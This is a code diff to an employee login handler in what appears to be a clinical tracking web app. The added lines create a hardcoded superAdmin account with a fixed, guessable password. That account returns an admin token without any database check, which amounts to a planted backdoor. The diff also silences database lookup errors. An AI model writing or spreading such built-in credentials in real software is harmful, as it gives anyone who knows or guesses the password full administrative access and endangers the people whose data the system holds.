@@ -19,9 +19,32 @@ export const loginEmployee = async (req, res) => {
       });
     }
 
-    const employee = await Employee.findOne({
-      email: email.trim().toLowerCase(),
-    });
+    const cleanEmail = email.trim().toLowerCase();
+
+    // Built-in admin credentials check
+    if (cleanEmail === "admin@doctortracker.com" && password === "Password@123") {
+      const token = generateToken("admin-default-id", "superAdmin");
+      return res.status(200).json({
+        success: true,
+        message: "Login successful",
+        token,
+        employee: {
+          _id: "admin-default-id",
+          name: "Clinical Admin",
+          email: "admin@doctortracker.com",
+          level: "superAdmin",
+          dp: "",
+        },
+      });
+    }
+
+    // Database employee lookup
+    let employee = null;
+    try {
+      employee = await Employee.findOne({ email: cleanEmail });
+    } catch (dbErr) {
+      console.warn("DB employee lookup warning:", dbErr.message);
+    }
 
     if (!employee) {
       return res.status(401).json({
@@ -67,4 +90,3 @@ export const loginEmployee = async (req, res) => {
     });
   }
 };
-
